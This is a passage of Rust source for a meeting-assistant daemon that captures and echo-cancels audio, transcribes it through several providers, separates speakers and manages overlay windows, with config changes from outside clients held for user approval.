//! The session: the socket, the overlay and one capture pipeline per saved config.

use std::collections::{BTreeSet, HashMap};
use std::future::Future;
use std::io;
use std::path::{Path, PathBuf};
use std::process::ExitStatus;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{Result, bail};
use futures::future::{BoxFuture, try_join_all};
use serde_json::{Value, json};
use tokio::sync::{OnceCell, Semaphore, mpsc, watch};
use tokio::task::{JoinHandle, JoinSet};

use crate::adapters::audio_file::WavFileSource;
use crate::adapters::audio_pipewire::PipeWire;
use crate::adapters::control_socket::{Clients, ControlSocket, Greeting};
use crate::adapters::diarizer_process;
use crate::adapters::hook_shell::ShellHooks;
use crate::adapters::http::Endpoint;
use crate::adapters::llm_openai::{OpenAIChat, Unavailable, list_models};
use crate::adapters::omapass;
use crate::adapters::overlay;
use crate::adapters::people_files::PeopleFiles;
use crate::adapters::session_files::{NoSessionFiles, SessionFiles};
use crate::adapters::stt_deepgram::{self, DeepgramBilling, DeepgramTranscriber};
use crate::adapters::stt_elevenlabs::{self, ElevenLabsTranscriber};
use crate::adapters::stt_openai::OpenAITranscriber;
use crate::adapters::terminal::terminal;
use crate::adapters::vad_silero::{SileroModel, SileroVad};
use crate::adapters::webvtt;
use crate::adapters::window_hyprland::HyprlandWindows;
use crate::config::{self, Config, ConfigError, Key, ModelConfig, ModelType};
use crate::domain::assistant::{Assistant, ContextSlot, Emit, Model, Reviewer, Setup, Translating};
use crate::domain::channel::{
    Captured, CapturedStream, Listeners, Transcriber, Trouble, Utterance, capture_channel,
    monitor_channel, transcribe,
};
use crate::domain::diarization::Diarization;
use crate::domain::events::{Outages, error};
use crate::domain::hub::{Capture, Hub};
use crate::domain::segmenter::{Segment, SegmenterConfig};
use crate::domain::transcribers::{Listening, Transcribers};
use crate::import;
use crate::paths;
use crate::ports::{
    AudioDevices, AudioError, AudioSource, Device, LanguageModel, PeopleStore, SessionLog,
    SpeechToText, StreamingSpeechToText, TranscriptionBilling,
};

/// The longest the assistant's model may send nothing before the request fails.
const LLM_SILENCE: Duration = Duration::from_secs(120);

/// One audio stream being captured, the participant it is heard as, and its colour.
pub struct Input {
    pub id: String,
    pub label: String,
    pub participant: String,
    /// Heard as the user: their voice is not told apart from others'.
    pub user: bool,
    pub color: Option<String>,
    pub source: Box<dyn AudioSource>,
    /// The same microphone with the others' audio cancelled, used while a session
    /// records when echo cancellation is on.
    pub cancelled: Option<Box<dyn AudioSource>>,
}

/// One input per configured device; devices that are not connected are reported and skipped.
pub fn inputs(
    config: &Config,
    replay: Option<&Path>,
    audio: &dyn AudioDevices,
    devices: &[Device],
    emit: &Emit,
) -> Vec<Input> {
    if let Some(replay) = replay {
        let participant = config
            .participants
            .iter()
            .find(|p| !p.user)
            .map_or("replay", |p| &p.name);
        let label = replay.file_name().unwrap_or_default().to_string_lossy();
        return vec![Input {
            id: "replay".into(),
            label: label.into(),
            participant: participant.into(),
            user: false,
            color: None,
            source: Box::new(WavFileSource::new(replay.into(), true)),
            cancelled: None,
        }];
    }
    let mut inputs: Vec<Input> = Vec::new();
    for participant in &config.participants {
        for device_id in &participant.devices {
            match devices.iter().find(|d| &d.id == device_id) {
                Some(device) => {
                    // Echo cancellation runs on one microphone: the user's first.
                    let cancels = config.audio.echo_cancel
                        && participant.user
                        && device.kind == "input"
                        && inputs.iter().all(|input| input.cancelled.is_none());
                    let cancelled = cancels.then(|| audio.capture_cancelled());
                    inputs.push(Input {
                        id: device.id.clone(),
                        label: device.label.clone(),
                        participant: participant.name.clone(),
                        user: participant.user,
                        color: config.colors.get(&device.id).cloned(),
                        source: audio.capture(device),
                        cancelled,
                    });
                }
                None => emit(error(
                    "input.disconnected",
                    format!("{}: {device_id} is not connected", participant.name),
                    json!({"participant": participant.name, "device": device_id}),
                )),
            }
        }
    }
    inputs
}

/// What runs on the inputs: capture and transcribe for what the recording
/// sessions listen with, or only measure, for `None`.
pub trait Work: Send {
    fn run(
        &mut self,
        listening: Option<watch::Receiver<BTreeSet<Listening>>>,
    ) -> BoxFuture<'_, Result<(), AudioError>>;
}

/// A registered transcription model, ready: a streaming provider for its WebSocket
/// URL, the OpenAI-compatible endpoint otherwise.
pub enum Stt {
    Segments(Box<dyn SpeechToText>),
    Stream(Box<dyn StreamingSpeechToText>),
}

/// A provider's key from where its section says: a variable, or omapass.
async fn api_key(key: Key<'_>) -> Result<Option<String>, String> {
    match key {
        Key::None => Ok(None),
        Key::Env(name) => config::env_key(name).map(Some).map_err(|e| e.0),
        Key::Omapass(account) => omapass::secret(account).await.map(Some),
    }
}

impl Stt {
    /// The transcriber for live audio, or for a `file` — Deepgram streams only
    /// as fast as the audio plays, so a file goes to it segment by segment.
    async fn build(stt: &ModelConfig, language: &str, file: bool) -> Result<Self, String> {
        let key = api_key(stt.key()).await?;
        let base = stt.base_url.trim_end_matches('/');
        if !(base.starts_with("ws://") || base.starts_with("wss://")) {
            let timeout = Duration::from_secs(30);
            let endpoint = Endpoint::new(base, key, timeout).map_err(|e| e.0)?;
            let stt = OpenAITranscriber::new(endpoint, &stt.model, language);
            return Ok(Self::Segments(Box::new(stt)));
        }
        if base.contains("deepgram.com") {
            let deepgram = DeepgramTranscriber::new(base, &stt.model, language, key);
            return Ok(if file {
                Self::Segments(Box::new(deepgram))
            } else {
                Self::Stream(Box::new(deepgram))
            });
        }
        if base.contains("elevenlabs.io") {
            let scribe = ElevenLabsTranscriber::new(base, &stt.model, language, key);
            return Ok(Self::Stream(Box::new(scribe)));
        }
        Err(format!("no streaming transcription known at {base}"))
    }

    fn transcriber(&self) -> Transcriber<'_> {
        match self {
            Self::Segments(stt) => Transcriber::Segments(stt.as_ref()),
            Self::Stream(stt) => Transcriber::Stream(stt.as_ref()),
        }
    }
}

/// What tells the cost of a transcription model's requests, when its provider
/// reports it and its key can be had: Deepgram's.
async fn billing(stt: &ModelConfig) -> Option<Arc<dyn TranscriptionBilling>> {
    if !stt.base_url.contains("deepgram.com") {
        return None;
    }
    let key = api_key(stt.key()).await.ok()??;
    let base = stt.base_url.trim_end_matches('/');
    Some(Arc::new(DeepgramBilling::new(base, key)))
}

/// A transcription model in one language, built the first time it is needed —
/// or why it could not be had.
type Ready = Arc<OnceCell<Result<Stt, String>>>;

/// Every transcription model in every language asked for so far: each built
/// once, for the pipeline's life.
#[derive(Clone, Default)]
struct Built(Arc<Mutex<HashMap<Listening, Ready>>>);

impl Built {
    fn cell(&self, listening: &Listening) -> Ready {
        let mut built = self.0.lock().expect("not poisoned");
        Arc::clone(built.entry(listening.clone()).or_default())
    }
}

/// The registered transcription models, by name.
type Models = Arc<HashMap<String, ModelConfig>>;

/// The model `listening` names, built in its language.
async fn build(models: &Models, listening: &Listening) -> Result<Stt, String> {
    let name = &listening.model;
    let stt = match models.get(name) {
        Some(model) => Stt::build(model, &listening.language, false).await,
        None => Err("not a registered transcription model".into()),
    };
    stt.map_err(|reason| format!("{name}: {reason}"))
}

struct Channels {
    inputs: Vec<Input>,
    audio: Arc<dyn AudioDevices>,
    models: Models,
    built: Built,
    assistant: Assistant,
    emit: Emit,
    vad: SileroModel,
    diarizer: Diarizer,
    outages: Outages,
}

/// One transcriber: an input's audio read from the hub by one model in one
/// language, each line going to every recording session listening with it.
/// It reads from when it starts, so what is said while its model is built
/// waits for it; a model that cannot be had is told, and the sessions only
/// measure.
fn transcriber(
    who: String,
    reader: CapturedStream<'static>,
    (models, cell): (Models, Ready),
    from: Listening,
    assistant: Assistant,
    (emit, outages): (Emit, Outages),
    lines: Option<Arc<Mutex<Vec<HeardLine>>>>,
) -> BoxFuture<'static, ()> {
    Box::pin(async move {
        let _stopped = outages.until_stopped(&who);
        let built = cell.get_or_init(|| async {
            let built = build(&models, &from).await;
            if let Err(reason) = &built {
                emit(error(
                    "stt.unavailable",
                    format!("transcription: {reason}"),
                    json!({"detail": reason}),
                ));
            }
            built
        });
        let Ok(stt) = built.await else {
            return;
        };
        let utterance = |utterance: Utterance| {
            let start = utterance.phrases.first().map_or(0.0, |p| p.start);
            let end = utterance.end();
            for (session, at) in assistant.hear(&from, &utterance) {
                if let Some(lines) = &lines {
                    let line = HeardLine {
                        session,
                        at,
                        start,
                        end,
                    };
                    lines.lock().expect("not poisoned").push(line);
                }
            }
        };
        let trouble = |who: &str, trouble: Trouble| emit(outages.note(who, &trouble));
        let partial = |words: String| assistant.hear_partial(&from, &who, &words);
        let bills = assistant.bills(&from);
        let request = |id: String| bills.opened(id);
        let billed = |id: String, seconds: f64| assistant.billed_segment(&from, &id, seconds);
        let listeners = Listeners {
            utterance: &utterance,
            trouble: &trouble,
            partial: &partial,
            request: &request,
            billed: &billed,
        };
        transcribe(&who, reader, stt.transcriber(), &listeners).await;
    })
}

impl Work for Channels {
    fn run(
        &mut self,
        listening: Option<watch::Receiver<BTreeSet<Listening>>>,
    ) -> BoxFuture<'_, Result<(), AudioError>> {
        Box::pin(async move {
            let Channels {
                inputs,
                audio,
                models,
                built,
                assistant,
                emit,
                vad,
                diarizer,
                outages,
            } = self;
            let recording = listening.is_some();
            // While a session records, the user's microphone may be echo-cancelled;
            // the module lives as long as this run.
            let microphone = inputs
                .iter()
                .find(|i| i.cancelled.is_some())
                .map(|i| i.id.clone());
            let echo = match microphone.filter(|_| recording) {
                Some(mic) => match audio.cancel_echo(&mic).await {
                    Ok(module) => Some(module),
                    Err(failure) => {
                        let detail = failure.0;
                        emit(error(
                            "echo_cancel.failed",
                            detail.clone(),
                            json!({"detail": detail}),
                        ));
                        None
                    }
                },
                None => None,
            };
            let cancelling = echo.is_some();
            let (emit, assistant, vad) = (&*emit, &*assistant, &*vad);
            // Each input is captured once, into the hub its transcribers read.
            let mut hub = Hub::default();
            let captures: Vec<Capture> = inputs.iter().map(|i| hub.input(&i.id)).collect();
            // The voices of the others' inputs are told apart while they record.
            let voices: Vec<Option<Voices>> = inputs
                .iter()
                .map(|input| {
                    let others = !input.user && recording;
                    others
                        .then(|| voices(assistant, emit, &input.participant, diarizer))
                        .flatten()
                })
                .collect();
            type Heard = (String, Option<Arc<Mutex<Vec<HeardLine>>>>);
            let heard: HashMap<String, Heard> = inputs
                .iter()
                .zip(&voices)
                .map(|(input, voices)| {
                    let lines = voices.as_ref().map(|voices| Arc::clone(&voices.lines));
                    (input.id.clone(), (input.participant.clone(), lines))
                })
                .collect();
            let channels = inputs.iter_mut().zip(captures).zip(&voices).map(
                |((input, capture), voices)| async move {
                    let source: &mut dyn AudioSource = match input.cancelled.as_mut() {
                        Some(cancelled) if cancelling => &mut **cancelled,
                        _ => &mut *input.source,
                    };
                    let mut vad = SileroVad::new(vad.clone());
                    let mut probability = |frame: &[i16]| {
                        vad.probability(frame)
                            .map_err(|e| AudioError(e.to_string()))
                    };
                    let id = input.id.clone();
                    let signal = move |level: f64, speech: bool| {
                        emit(json!({"type": "signal", "input": id, "level": level, "speech": speech}));
                    };
                    // Outside a session the audio is only measured, never segmented.
                    if !recording {
                        let threshold = SegmenterConfig::default().threshold;
                        return monitor_channel(source, &mut probability, &signal, threshold).await;
                    }
                    let regions = voices.as_ref().map(|voices| voices.regions.clone());
                    // The capture goes with this closure, so its readers end when the source does.
                    let captured = move |captured: Captured| {
                        if let (Some(regions), Captured::Segment(segment, _)) =
                            (&regions, &captured)
                        {
                            let _ = regions.send(segment.clone());
                        }
                        capture.send(captured);
                    };
                    let config = SegmenterConfig::default();
                    capture_channel(source, &mut probability, &signal, config, &captured).await
                },
            );
            let mut captured = std::pin::pin!(try_join_all(channels));
            let Some(mut listening) = listening else {
                return captured.await.map(|_| ());
            };
            let mut transcribers = Transcribers::new(heard.keys().cloned().collect());
            loop {
                let wanted = listening.borrow_and_update().clone();
                transcribers.follow(&wanted, &mut |input, listen| {
                    let (who, lines) = heard[input].clone();
                    let reader = hub.read(input).expect("the hub has every input");
                    let model = (Arc::clone(models), built.cell(listen));
                    let assistant = assistant.clone();
                    transcriber(
                        who,
                        reader,
                        model,
                        listen.clone(),
                        assistant,
                        (Arc::clone(emit), outages.clone()),
                        lines,
                    )
                });
                tokio::select! {
                    ran = &mut captured => {
                        transcribers.finish().await;
                        drop(echo);
                        return ran.map(|_| ());
                    }
                    changed = listening.changed() => if changed.is_err() {
                        return Ok(());
                    },
                }
            }
        })
    }
}

/// A line a live input became: its session, its time, and where its speech
/// starts and ends in the input, in seconds.
struct HeardLine {
    session: String,
    at: f64,
    start: f64,
    end: f64,
}

/// The voices of one live input, told apart by a child diarizer while it records:
/// its speech goes to the child, never to disk, and each line it became is kept.
struct Voices {
    regions: std::sync::mpsc::Sender<Segment>,
    lines: Arc<Mutex<Vec<HeardLine>>>,
}

/// What the diarizer found, once the sender of its speech is dropped.
type Found = Box<dyn FnOnce(Result<Diarization, String>) + Send>;

/// Starts a diarizer that tells the voices of one input apart: the sender its
/// speech goes to, or `None` when the speaker model is not set up.
type Diarizer = Arc<dyn Fn(Found) -> Option<std::sync::mpsc::Sender<Segment>> + Send + Sync>;

/// Start telling the voices heard as `who` apart, when `diarizer` can; once the
/// input stops recording, the session's lines get their voices.
fn voices(assistant: &Assistant, emit: &Emit, who: &str, diarizer: &Diarizer) -> Option<Voices> {
    let lines: Arc<Mutex<Vec<HeardLine>>> = Arc::default();
    let (assistant, emit, who) = (assistant.clone(), Arc::clone(emit), who.to_string());
    let heard = Arc::clone(&lines);
    let regions = diarizer(Box::new(move |found| match found {
        Ok(diarization) => {
            let lines = std::mem::take(&mut *heard.lock().expect("not poisoned"));
            let mut sessions: Vec<&str> = lines.iter().map(|line| line.session.as_str()).collect();
            sessions.sort_unstable();
            sessions.dedup();
            for session in sessions {
                let spans: Vec<(f64, f64, f64)> = lines
                    .iter()
                    .filter(|line| line.session == session)
                    .map(|line| (line.at, line.start, line.end))
                    .collect();
                assistant.voices_heard(session, &who, &spans, &diarization);
            }
        }
        Err(detail) => emit(error(
            "diarization.failed",
            format!("diarization: {detail}"),
            json!({"detail": detail}),
        )),
    }))?;
    Some(Voices { regions, lines })
}

/// Run `work` capturing for what the recording sessions listen with, or only
/// measuring while none records; it restarts only when that switches, so a
/// session starting beside another never stops a capture.
///
/// The running work is dropped whenever this future is, so a restart never leaves
/// an orphan capture behind — it would keep its pw-record and duplicate every frame
/// and every line. A capture that dies is reported, not left silent.
pub async fn follow_recording(
    mut listening: watch::Receiver<BTreeSet<Listening>>,
    work: &mut dyn Work,
    emit: &Emit,
) {
    loop {
        let active = !listening.borrow_and_update().is_empty();
        let failure = tokio::select! {
            result = work.run(active.then(|| listening.clone())) => result.err(),
            switched = switches(&mut listening, active) => match switched {
                Ok(()) => continue,
                Err(_) => return,
            },
        };
        if let Some(failure) = failure {
            emit(error(
                "capture.stopped",
                format!("capture stopped: {failure}"),
                json!({"detail": failure.to_string()}),
            ));
        }
        if switches(&mut listening, active).await.is_err() {
            return;
        }
    }
}

/// Wait until some session records while none did (`active` false), or none
/// does any more.
async fn switches(
    listening: &mut watch::Receiver<BTreeSet<Listening>>,
    active: bool,
) -> Result<(), watch::error::RecvError> {
    loop {
        listening.changed().await?;
        if listening.borrow().is_empty() == active {
            return Ok(());
        }
    }
}

/// Stop `previous` and wait until it is gone, so two pipelines never hold the devices.
pub async fn stop(previous: Option<JoinHandle<()>>) {
    if let Some(previous) = previous {
        previous.abort();
        let _ = previous.await;
    }
}

/// Gives the setup back to the assistant however the pipeline ends.
struct Configured {
    assistant: Assistant,
    setup: Arc<Setup>,
}

impl Drop for Configured {
    fn drop(&mut self) {
        self.assistant.release(&self.setup);
    }
}

/// What every pipeline hears with, whatever its config: the file replayed or
/// the devices, the VAD, and the diarizer.
#[derive(Clone)]
struct Rig {
    replay: Option<PathBuf>,
    audio: Arc<dyn AudioDevices>,
    vad: SileroModel,
    diarizer: Diarizer,
    outages: Outages,
}

/// Capture, transcribe and serve actions with one configuration until dropped.
async fn pipeline(config: Config, assistant: Assistant, emit: Emit, rig: Rig) {
    let Rig {
        replay,
        audio,
        vad,
        diarizer,
        outages,
    } = rig;
    let devices = if replay.is_some() {
        Vec::new()
    } else {
        audio.list().await
    };
    let inputs = inputs(&config, replay.as_deref(), &*audio, &devices, &emit);
    // Each part stands on its own: one that cannot be set up — a key missing,
    // say — is reported to every client with the setup, and the rest works on.
    let mut problems = Vec::new();
    let unavailable = |code: &str, part: &str, reason: &str| {
        error(code, format!("{part}: {reason}"), json!({"detail": reason}))
    };
    // Each kind transcribes with its own model or the default, built in the
    // configured language now, so a missing key is told with the setup.
    let kind_transcribers: HashMap<String, String> = config
        .kinds
        .iter()
        .map(|kind| (kind.clone(), config.transcriber(kind).name.clone()))
        .collect();
    let transcription_models: HashMap<String, ModelConfig> = config
        .models
        .iter()
        .filter(|model| model.kind == ModelType::Transcription)
        .map(|model| (model.name.clone(), model.clone()))
        .collect();
    let transcription_models = Arc::new(transcription_models);
    let built = Built::default();
    let defaults: BTreeSet<&String> = kind_transcribers
        .values()
        .chain([&config.stt.model])
        .collect();
    for name in defaults {
        let listening = Listening {
            model: name.clone(),
            language: config.stt.language.clone(),
        };
        let cell = built.cell(&listening);
        let ready = cell.get_or_init(|| build(&transcription_models, &listening));
        if let Err(reason) = ready.await {
            problems.push(unavailable("stt.unavailable", "transcription", reason));
        }
    }
    let mut transcription_billing = HashMap::new();
    for (name, model) in transcription_models.iter() {
        if let Some(billing) = billing(model).await {
            transcription_billing.insert(name.clone(), billing);
        }
    }
    let reviewer = config.reviewer.as_ref().filter(|r| r.enabled);
    let kind_chat = |kind: &String| config.model_of_kind(ModelType::Chat, kind);
    // Only the models something uses are built, each once.
    let used = std::iter::once(&config.llm.model)
        .chain(reviewer.map(|r| &r.model))
        .chain(config.actions.iter().filter_map(|a| a.model.as_ref()))
        .chain(config.kinds.iter().filter_map(kind_chat).map(|m| &m.name))
        .chain(
            config
                .kinds
                .iter()
                .map(|kind| &config.translator(kind).name),
        )
        .chain([&config.translator("").name]);
    let mut models: HashMap<String, Model> = HashMap::new();
    for name in used {
        let Some(registered) = config.model(name).filter(|_| !models.contains_key(name)) else {
            continue;
        };
        let llm: Arc<dyn LanguageModel> = match chat_model(registered).await {
            Ok(chat) => Arc::new(chat),
            Err(reason) => {
                let message = format!("model {name}: {reason}");
                problems.push(error(
                    "model.unavailable",
                    message,
                    json!({"name": name, "detail": reason}),
                ));
                Arc::new(Unavailable(reason))
            }
        };
        let id = registered.model.clone();
        // The fields that make requests what they are; a change cancels the answers streaming on it.
        let settings = json!([
            registered.base_url,
            registered.model,
            registered.api_key_env,
            registered.api_key_omapass,
            registered.request_fields()
        ]);
        let settings = settings.to_string();
        models.insert(name.clone(), Model { llm, id, settings });
    }
    // A valid config names a registered assistant model, so it was built.
    let model = models[&config.llm.model].clone();
    let kind_models: HashMap<String, Model> = config
        .kinds
        .iter()
        .filter_map(|kind| Some((kind.clone(), models[&kind_chat(kind)?.name].clone())))
        .collect();
    let routes: serde_json::Map<String, Value> = config
        .kinds
        .iter()
        .map(|kind| {
            let chat = kind_chat(kind).map_or(&config.llm.model, |m| &m.name);
            let used = json!({"transcription": kind_transcribers[kind], "chat": chat});
            (kind.clone(), used)
        })
        .collect();
    let reviewer = reviewer.and_then(|on| {
        Some(Reviewer {
            model: models.get(&on.model)?.clone(),
            prompt: on.prompt.clone(),
            verbose: on.verbose,
        })
    });
    let context = match config.context() {
        Ok(context) => context,
        Err(failure) => {
            problems.push(unavailable(
                "context.unavailable",
                "context",
                &failure.to_string(),
            ));
            String::new()
        }
    };
    let slots = config
        .slot_texts()
        .into_iter()
        .map(|(slot, text)| {
            let text = text.unwrap_or_else(|failure| {
                let part = format!("context {}", slot.name);
                problems.push(unavailable(
                    "context.unavailable",
                    &part,
                    &failure.to_string(),
                ));
                String::new()
            });
            ContextSlot {
                name: slot.name.clone(),
                kinds: slot.kinds.clone(),
                text,
            }
        })
        .collect();
    let translation = Translating {
        model: models[&config.translator("").name].clone(),
        kind_models: config
            .kinds
            .iter()
            .filter(|kind| config.models.iter().any(|m| m.translates.contains(kind)))
            .map(|kind| (kind.clone(), models[&config.translator(kind).name].clone()))
            .collect(),
    };
    let setup = Arc::new(Setup {
        model,
        models,
        kind_models,
        translation,
        routes: Value::Object(routes),
        actions: config.actions.clone(),
        rules: config.rules.clone(),
        reviewer,
        context,
        slots,
        max_context_chars: config.llm.max_context_chars,
        participants: config
            .participants
            .iter()
            .map(|p| (p.name.clone(), p.user))
            .collect(),
        inputs: inputs
            .iter()
            .map(|i| json!({"id": i.id, "label": i.label, "participant": i.participant, "color": i.color}))
            .collect(),
        language: config.stt.language.clone(),
        languages: config.stt.languages.clone(),
        kinds: config.kinds.clone(),
        drop_echoes: config.audio.drop_echoes,
        ui_language: config.ui_language.clone(),
        transcription: kind_transcribers.clone(),
        default_transcription: config.stt.model.clone(),
        transcription_prices: config
            .models
            .iter()
            .filter_map(|m| Some((m.name.clone(), m.price_per_minute?)))
            .collect(),
        transcription_billing,
        problems,
        limit: Arc::new(Semaphore::new(config.llm.concurrency)),
    });
    assistant.configure(Arc::clone(&setup));
    let _configured = Configured {
        assistant: assistant.clone(),
        setup,
    };
    for event in assistant.snapshot() {
        emit(event);
    }
    let mut channels = Channels {
        inputs,
        audio,
        models: transcription_models,
        built,
        assistant: assistant.clone(),
        emit: Arc::clone(&emit),
        vad,
        diarizer,
        outages,
    };
    // Transcribe only while a session records; otherwise only measure the inputs,
    // so the overlay shows they work.
    follow_recording(assistant.listening(), &mut channels, &emit).await;
}

/// A registered chat model, with its key; why not, when it cannot be had. A
/// local one may read a long context for minutes before its first word.
async fn chat_model(model: &ModelConfig) -> Result<OpenAIChat, String> {
    let key = api_key(model.key()).await?;
    let endpoint = Endpoint::new(&model.base_url, key, LLM_SILENCE).map_err(|e| e.0)?;
    Ok(OpenAIChat::new(endpoint, model.request_fields()))
}

/// A JSON list of names, or `None` when it is not one.
fn names(value: Option<&Value>) -> Option<Vec<String>> {
    let list = value?.as_array()?;
    list.iter()
        .map(|name| name.as_str().map(String::from))
        .collect()
}

/// Split a command line into its verb and the rest, if any.
fn split(command: &str) -> (&str, Option<&str>) {
    match command.split_once(char::is_whitespace) {
        Some((verb, rest)) if !rest.trim().is_empty() => (verb, Some(rest.trim_start())),
        Some((verb, _)) => (verb, None),
        None => (command, None),
    }
}

/// `window.show {"window", "session"}`: the overlay window `window` shows the live
/// session `session` now, or none when it is empty.
fn window_shows(payload: &str) -> Option<(u32, String)> {
    let request = serde_json::from_str::<Value>(payload).ok()?;
    let number = u32::try_from(request.get("window")?.as_u64()?).ok()?;
    let session = request.get("session")?.as_str()?.to_string();
    Some((number, session))
}

/// `window.call {"call", "path"}`: what a shortcut asks of an overlay window —
/// "focus", "config", "new_session", "sessions", or "import" with the file's
/// `path`, which may be left out — as the fields of the `window_call` event;
/// `None` when it is none of these.
fn window_call(payload: &str) -> Option<Value> {
    let request = serde_json::from_str::<Value>(payload).ok()?;
    let call = request.get("call")?.as_str()?;
    let mut fields = json!({"call": call});
    match (call, request.get("path")) {
        ("focus" | "config" | "new_session" | "sessions" | "import", None) => {}
        ("import", Some(path)) => fields["path"] = json!(path.as_str()?),
        _ => return None,
    }
    Some(fields)
}

/// Where a shortcut's call goes: the newest window open, focused, with the
/// `window_call` event it makes; or a window opened, focused, with the call's
/// JSON to make. "focus" asks nothing more of the window.
#[derive(Debug, PartialEq)]
enum CallTo {
    Window(u32, Option<Value>),
    NewWindow(Option<String>),
}

fn route_call(newest: Option<u32>, mut call: Value) -> CallTo {
    let asks = call["call"] != "focus";
    match newest {
        Some(number) => CallTo::Window(
            number,
            asks.then(|| {
                call["type"] = json!("window_call");
                call["window"] = json!(number);
                call
            }),
        ),
        None => CallTo::NewWindow(asks.then(|| call.to_string())),
    }
}

/// The overlay windows as the daemon's loop drives them: `overlay::Windows`,
/// whose windows are eco-window processes, or a fake in tests.
trait Overlay: Send {
    /// The live sessions some window shows.
    fn shown(&self) -> Vec<String>;
    /// The window opened last of those still open.
    fn newest(&self) -> Option<u32>;
    fn is_open(&self) -> bool;
    /// Open another window, focused, that shows `show` and makes `call`.
    fn open<'a>(
        &'a mut self,
        show: Option<&'a str>,
        call: Option<&'a str>,
    ) -> BoxFuture<'a, io::Result<()>>;
    /// Give the keyboard to the open window `number`.
    fn focus(&self, number: u32) -> BoxFuture<'_, io::Result<()>>;
    /// Note the session the window `number` shows now, or none when empty.
    fn shows(&mut self, number: u32, session: &str);
    /// Leave every window out of screen sharing, or show them in it again.
    fn hide_from_share(&mut self, hidden: bool) -> BoxFuture<'_, ()>;
    /// Resolves when a window exits; never, without one.
    fn exited(&mut self) -> BoxFuture<'_, Option<ExitStatus>>;
    /// Terminate every window and wait for them to exit.
    fn close(self: Box<Self>) -> BoxFuture<'static, ()>;
}

impl Overlay for overlay::Windows {
    fn shown(&self) -> Vec<String> {
        overlay::Windows::shown(self).map(String::from).collect()
    }

    fn newest(&self) -> Option<u32> {
        overlay::Windows::newest(self)
    }

    fn is_open(&self) -> bool {
        overlay::Windows::is_open(self)
    }

    fn open<'a>(
        &'a mut self,
        show: Option<&'a str>,
        call: Option<&'a str>,
    ) -> BoxFuture<'a, io::Result<()>> {
        Box::pin(overlay::Windows::open(self, show, call))
    }

    fn focus(&self, number: u32) -> BoxFuture<'_, io::Result<()>> {
        Box::pin(overlay::Windows::focus(self, number))
    }

    fn shows(&mut self, number: u32, session: &str) {
        overlay::Windows::shows(self, number, session);
    }

    fn hide_from_share(&mut self, hidden: bool) -> BoxFuture<'_, ()> {
        Box::pin(overlay::Windows::hide_from_share(self, hidden))
    }

    fn exited(&mut self) -> BoxFuture<'_, Option<ExitStatus>> {
        Box::pin(overlay::Windows::exited(self))
    }

    fn close(self: Box<Self>) -> BoxFuture<'static, ()> {
        Box::pin(overlay::Windows::close(*self))
    }
}

/// What a `config.set` leads to: a config to save, `own` when the window sent
/// it, or one held until the user confirms it in an eco window, with the
/// `config_pending` event that names why.
enum ConfigChange {
    Adopt {
        config: Result<Config, String>,
        own: bool,
    },
    Hold(Config, Value),
}

/// A `config.set` carrying the windows' `token` is the user's own and is saved.
/// From any other client, one that adds or changes an action's hook, adds a
/// context file, or adds a model or changes its base_url or key source is held
/// instead: those run commands, send files to a model, and send keys to an address.
fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
    let mut request = match serde_json::from_str::<Value>(payload) {
        Ok(request) => request,
        Err(e) => {
            return ConfigChange::Adopt {
                config: Err(e.to_string()),
                own: false,
            };
        }
    };
    let from_window = request
        .as_object_mut()
        .and_then(|fields| fields.remove("token"))
        .is_some_and(|given| given == token);
    let config = match Config::from_value(request) {
        Ok(config) => config,
        Err(e) => {
            return ConfigChange::Adopt {
                config: Err(e.0),
                own: from_window,
            };
        }
    };
    if from_window {
        return ConfigChange::Adopt {
            config: Ok(config),
            own: true,
        };
    }
    let hooks: Vec<Value> = config
        .actions
        .iter()
        .filter(|action| !action.hook.is_empty())
        .filter(|action| {
            !current
                .actions
                .iter()
                .any(|known| known.name == action.name && known.hook == action.hook)
        })
        .map(|action| json!({"action": action.name, "command": action.hook}))
        .collect();
    let files = |config: &Config| -> Vec<String> {
        let slots = config.contexts.iter().flat_map(|slot| slot.files.iter());
        config.context_files.iter().chain(slots).cloned().collect()
    };
    let known = files(current);
    let mut added: Vec<String> = Vec::new();
    for file in files(&config) {
        if !known.contains(&file) && !added.contains(&file) {
            added.push(file);
        }
    }
    // A model's key is sent to its base_url: a new model, or a known one at
    // another address or with another key, is the user's to approve.
    let models: Vec<Value> = config
        .models
        .iter()
        .filter(|model| {
            !current.models.iter().any(|known| {
                known.name == model.name
                    && known.base_url == model.base_url
                    && known.key() == model.key()
            })
        })
        .map(|model| {
            let (env, omapass) = match model.key() {
                Key::None => (None, None),
                Key::Env(name) => (Some(name), None),
                Key::Omapass(account) => (None, Some(account)),
            };
            json!({
                "name": model.name,
                "base_url": model.base_url,
                "api_key_env": env,
                "api_key_omapass": omapass,
            })
        })
        .collect();
    if hooks.is_empty() && added.is_empty() && models.is_empty() {
        return ConfigChange::Adopt {
            config: Ok(config),
            own: false,
        };
    }
    let event = json!({"type": "config_pending", "hooks": hooks, "files": added, "models": models});
    ConfigChange::Hold(config, event)
}

/// The `config_pending` event once nothing waits for the user.
fn nothing_pending() -> Value {
    json!({"type": "config_pending", "id": null, "hooks": [], "files": [], "models": []})
}

/// The one config held for the user. Each held change gets an id not used
/// before in this run; approving or rejecting names it, so the user's choice
/// applies only to the change the window showed.
#[derive(Default)]
struct Pending {
    last: u64,
    held: Option<(u64, Config, Value)>,
}

impl Pending {
    /// Whether `change` may go on: while a change waits for the user, only the
    /// window's own, so the dialog never changes under the user's pointer.
    fn admits(&self, change: &ConfigChange) -> bool {
        self.held.is_none() || matches!(change, ConfigChange::Adopt { own: true, .. })
    }

    /// Hold `config` under a new id; its `config_pending` event, with the id.
    fn hold(&mut self, config: Config, mut event: Value) -> Value {
        self.last += 1;
        event["id"] = json!(self.last.to_string());
        self.held = Some((self.last, config, event.clone()));
        event
    }

    /// The held config, taken, when `id` names it.
    fn take(&mut self, id: &str) -> Option<Config> {
        let named = self
            .held
            .as_ref()
            .is_some_and(|(held, ..)| id == held.to_string());
        named
            .then(|| self.held.take())
            .flatten()
            .map(|(_, config, _)| config)
    }

    /// Drop the held config; whether one was held.
    fn clear(&mut self) -> bool {
        self.held.take().is_some()
    }

    /// The held change's `config_pending` event.
    fn event(&self) -> Option<Value> {
        self.held.as_ref().map(|(.., event)| event.clone())
    }
}

/// What a client that connects is told first: the daemon, the snapshot, the
/// sources whose transcription is down, and the change held for the user, if any.
fn greeting(
    assistant: Assistant,
    overlay_open: Arc<AtomicBool>,
    outages: Outages,
    pending: Arc<Mutex<Pending>>,
